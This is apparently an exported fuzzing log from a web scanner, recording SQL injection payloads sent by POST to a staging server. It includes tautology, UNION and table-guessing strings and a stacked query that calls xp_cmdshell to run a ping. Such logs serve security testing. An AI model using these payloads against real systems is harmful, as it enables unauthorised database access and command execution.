Task ID,Message Type,Req. Timestamp,Method,URL,Code,Reason,RTT,Size Req. Header,Size Req. Body,Size Resp. Header,Size Resp. Body,Highest Alert,State,Payloads
0,Original,Sat Jun 06 16:38:44 CEST 2020,POST,http://staging.itapp.eus/,500,Internal Server Error,547,578,104,249,107461,,,[]
5,Fuzzed,Sat Jun 06 16:43:02 CEST 2020,POST,http://staging.itapp.eus/,500,Internal Server Error,501,577,95,249,112462,,Reflected,[@]
2,Fuzzed,Sat Jun 06 16:43:02 CEST 2020,POST,http://staging.itapp.eus/,500,Internal Server Error,504,577,97,249,112688,,,[a' ]
4,Fuzzed,Sat Jun 06 16:43:02 CEST 2020,POST,http://staging.itapp.eus/,500,Internal Server Error,630,578,107,249,113278,,,[a' or 1=1; --]
1,Fuzzed,Sat Jun 06 16:43:02 CEST 2020,POST,http://staging.itapp.eus/,500,Internal Server Error,648,577,95,249,112460,,Reflected,[a]
3,Fuzzed,Sat Jun 06 16:43:02 CEST 2020,POST,http://staging.itapp.eus/,500,Internal Server Error,724,577,99,249,112883,,,[a' --]
7,Fuzzed,Sat Jun 06 16:43:03 CEST 2020,POST,http://staging.itapp.eus/,500,Internal Server Error,397,578,114,249,113800,,,[' and 1=0) union all]
6,Fuzzed,Sat Jun 06 16:43:03 CEST 2020,POST,http://staging.itapp.eus/,500,Internal Server Error,403,577,95,249,112461,,Reflected,[?]
8,Fuzzed,Sat Jun 06 16:43:03 CEST 2020,POST,http://staging.itapp.eus/,500,Internal Server Error,407,578,105,249,113137,,Reflected,[? or 1=1 --]
9,Fuzzed,Sat Jun 06 16:43:03 CEST 2020,POST,http://staging.itapp.eus/,500,Internal Server Error,392,578,119,249,114034,,,[x' and userid is NULL; --]
10,Fuzzed,Sat Jun 06 16:43:03 CEST 2020,POST,http://staging.itapp.eus/,500,Internal Server Error,429,578,118,249,114000,,,[x' and email is NULL; --]
11,Fuzzed,Sat Jun 06 16:43:03 CEST 2020,POST,http://staging.itapp.eus/,500,Internal Server Error,381,578,113,249,114185,,,[anything' or 'x'='x]
12,Fuzzed,Sat Jun 06 16:43:03 CEST 2020,POST,http://staging.itapp.eus/,500,Internal Server Error,389,578,137,249,115240,,,[x' and 1=(select count(*) from tabname); --]
13,Fuzzed,Sat Jun 06 16:43:03 CEST 2020,POST,http://staging.itapp.eus/,500,Internal Server Error,438,578,126,249,114473,,,[x' and members.email is NULL; --]
14,Fuzzed,Sat Jun 06 16:43:03 CEST 2020,POST,http://staging.itapp.eus/,500,Internal Server Error,434,578,121,249,114346,,,[x' or full_name like '%bob%]
15,Fuzzed,Sat Jun 06 16:43:03 CEST 2020,POST,http://staging.itapp.eus/,500,Internal Server Error,444,578,107,249,113115,,,[23 or 1=1; --]
16,Fuzzed,Sat Jun 06 16:43:04 CEST 2020,POST,http://staging.itapp.eus/,500,Internal Server Error,475,578,143,249,112801,,,['; exec master..xp_cmdshell 'ping 172.10.1.255'--]
